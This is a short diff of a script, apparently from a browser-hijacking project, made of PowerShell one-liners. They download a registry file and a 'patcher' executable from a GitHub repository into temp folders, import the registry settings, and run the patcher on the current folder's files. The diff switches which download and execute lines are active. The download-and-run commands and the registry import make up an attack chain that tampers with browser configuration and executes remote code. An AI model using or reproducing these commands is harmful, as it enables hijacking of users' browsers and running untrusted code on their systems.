@@ -2,11 +2,11 @@
 powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/ieconf.reg?token=ALZQ6ESZF7MH6AW7VIFJELTBAE3UO', '`"$env:tmp/ieconf.reg`"')}"
 
 # Download exe file for patching the infected file
-powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/blob/main/patcher_v67.exe?raw=true', '`"$env:temp/patcher.exe`"');}"
+# powershell -command "&{(new-object System.Net.WebClient).DownloadFile('https://github.com/icesonata/Browser-Hijacking/blob/main/patcher_v67.exe?raw=true', '`"$env:temp/patcher.exe`"');}"
 
 # Import reg file into registry
 #powershell -command "&{reg import $env:temp\\ieconf.reg}"
 
 # Execute patching file
-#powershell -command "&{. $env:temp\\patcher.exe --unlease (Get-Item .).FullName}"
+powershell -command "&{. $env:temp\\patcher.exe --unlease (Get-Item .).FullName}"
 
